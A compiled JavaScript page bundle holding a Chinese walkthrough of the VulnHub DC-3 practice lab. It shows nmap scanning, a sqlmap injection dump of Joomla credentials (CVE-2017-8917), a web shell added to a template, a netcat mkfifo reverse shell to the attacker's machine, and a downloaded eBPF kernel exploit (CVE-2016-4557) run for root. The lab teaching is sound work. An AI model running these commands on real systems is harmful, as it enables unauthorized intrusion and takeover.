(window.webpackJsonp=window.webpackJsonp||[]).push([[48],{802:function(s,a,e){"use strict";e.r(a);var n=e(1),t=Object(n.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h2",{attrs:{id:"_0x01-部署"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-部署"}},[s._v("#")]),s._v(" 0x01 部署")]),s._v(" "),e("p",[s._v("靶机地址：")]),s._v(" "),e("blockquote",[e("p",[e("a",{attrs:{href:"https://www.vulnhub.com/entry/dc-3,312/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://www.vulnhub.com/entry/dc-3,312/"),e("OutboundLink")],1)])]),s._v(" "),e("p",[e("strong",[s._v("DESCRIPTION")])]),s._v(" "),e("p",[s._v("DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.")]),s._v(" "),e("p",[s._v("As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.")]),s._v(" "),e("p",[s._v("Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.")]),s._v(" "),e("p",[s._v("For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.")]),s._v(" "),e("p",[s._v("For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).")]),s._v(" "),e("p",[s._v("If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.")]),s._v(" "),e("p",[s._v("只有一个flag")]),s._v(" "),e("h2",{attrs:{id:"_0x02-信息收集"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-信息收集"}},[s._v("#")]),s._v(" 0x02 信息收集")]),s._v(" "),e("p",[s._v("靶机使用virtual box部署，kali使用vmware部署，都为桥接模式")]),s._v(" "),e("p",[s._v("nmap扫描网段")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("nmap -sP 172.21.34.0/24\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924101423240.png",alt:"image-20210924101423240"}})]),s._v(" "),e("p",[s._v("发现靶机IP：172.21.34.31，继续扫描")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("nmap -T5 -A -v -p- 172.21.34.31\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("结果：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 10:04 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating ARP Ping Scan at 10:04\nScanning 172.21.34.31 [1 port]\nCompleted ARP Ping Scan at 10:04, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 10:04\nCompleted Parallel DNS resolution of 1 host. at 10:04, 0.00s elapsed\nInitiating SYN Stealth Scan at 10:04\nScanning 172.21.34.31 [65535 ports]\nDiscovered open port 80/tcp on 172.21.34.31\nCompleted SYN Stealth Scan at 10:04, 1.27s elapsed (65535 total ports)\nInitiating Service scan at 10:04\nScanning 1 service on 172.21.34.31\nCompleted Service scan at 10:04, 11.06s elapsed (1 service on 1 host)\nInitiating OS detection (try #1) against 172.21.34.31\nNSE: Script scanning 172.21.34.31.\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.41s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.04s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nNmap scan report for 172.21.34.31\nHost is up (0.00072s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA\n|_http-generator: Joomla! - Open Source Content Management\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Home\nMAC Address: 08:00:27:2E:55:BC (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 198.048 days (since Wed Mar 10 08:55:41 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=259 (Good luck!)\nIP ID Sequence Generation: All zeros\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.73 ms 172.21.34.31\n\nNSE: Script Post-scanning.\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.28 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br"),e("span",{staticClass:"line-number"},[s._v("51")]),e("br"),e("span",{staticClass:"line-number"},[s._v("52")]),e("br"),e("span",{staticClass:"line-number"},[s._v("53")]),e("br"),e("span",{staticClass:"line-number"},[s._v("54")]),e("br"),e("span",{staticClass:"line-number"},[s._v("55")]),e("br"),e("span",{staticClass:"line-number"},[s._v("56")]),e("br"),e("span",{staticClass:"line-number"},[s._v("57")]),e("br"),e("span",{staticClass:"line-number"},[s._v("58")]),e("br"),e("span",{staticClass:"line-number"},[s._v("59")]),e("br"),e("span",{staticClass:"line-number"},[s._v("60")]),e("br"),e("span",{staticClass:"line-number"},[s._v("61")]),e("br"),e("span",{staticClass:"line-number"},[s._v("62")]),e("br"),e("span",{staticClass:"line-number"},[s._v("63")]),e("br"),e("span",{staticClass:"line-number"},[s._v("64")]),e("br"),e("span",{staticClass:"line-number"},[s._v("65")]),e("br")])]),e("p",[s._v("发现80端口，运行的Joomla")]),s._v(" "),e("h2",{attrs:{id:"_0x03-漏洞利用"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-漏洞利用"}},[s._v("#")]),s._v(" 0x03 漏洞利用")]),s._v(" "),e("p",[s._v("使用msf查看Joomla版本为3.7.0")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924102654550.png",alt:"image-20210924102654550"}})]),s._v(" "),e("p",[s._v("搜索Joomla 3.7.0版本漏洞")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924102850545.png",alt:"image-20210924102850545"}})]),s._v(" "),e("p",[s._v("发现CVE-2017-8917 SQL注入漏洞： https://www.exploit-db.com/exploits/42033")]),s._v(" "),e("p",[s._v("上sqlmap")]),s._v(" "),e("div",{staticClass:"language-txt line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-txt"}},[e("code",[s._v("sqlmap -u \"http://172.21.34.31/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T '#__users' -C username,password --dump\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("发现用户")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924103753282.png",alt:"image-20210924103753282"}})]),s._v(" "),e("p",[s._v("使用john爆破，得到密码")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924104911090.png",alt:"image-20210924104911090"}})]),s._v(" "),e("p",[s._v("在"),e("code",[s._v("http://172.21.34.31/administrator/index.php")]),s._v("登录，发现模板编辑功能，可以愉快的加马了，修改Beez3模板下index.php，加上一句话")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924111319969.png",alt:"image-20210924111319969"}})]),s._v(" "),e("p",[s._v("修改完成后将Beez3模板设置为默认模板，使用蚁剑连接成功")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924111451058.png",alt:"image-20210924111451058"}})]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924111544587.png",alt:"image-20210924111544587"}})]),s._v(" "),e("p",[s._v("先拿shell，kali上运行")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("nc -lvp 4444\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("因为靶机上是openbsd nc，不支持-e，所以使用以下命令反弹shell")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.134 4444 >/tmp/f\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924141311663.png",alt:"image-20210924141311663"}})]),s._v(" "),e("h2",{attrs:{id:"_0x04-提权"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x04-提权"}},[s._v("#")]),s._v(" 0x04 提权")]),s._v(" "),e("p",[s._v("查看当前目录下，未找到flag相关文件，考虑提权，根据ubuntu和内核版本搜索相关漏洞")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("searchsploit -w ubuntu 16.04 4.4\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924141536034.png",alt:"image-20210924141536034"}})]),s._v(" "),e("p",[s._v("使用CVE-2016-4557：https://www.exploit-db.com/exploits/39772")]),s._v(" "),e("p",[s._v("kali下载EXP")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip  --no-check-certificate\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("启动web服务")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("python -m SimpleHTTPServer 8090\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("靶机下载，解压，编译运行")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("wget http://172.21.34.30:8090/39772.zip\nunzip 39772.zip\ncd 39772\ntar xvf exploit.tar\ncd ebpf_mapfd_doubleput_exploit\nsh compile.sh\n./doubleput\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br")])]),e("p",[s._v("提权成功获得root权限，在"),e("code",[s._v("/root/")]),s._v("下发现flag文件，获得flag")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20210924142338904.png",alt:"image-20210924142338904"}})])])}),[],!1,null,null,null);a.default=t.exports}}]);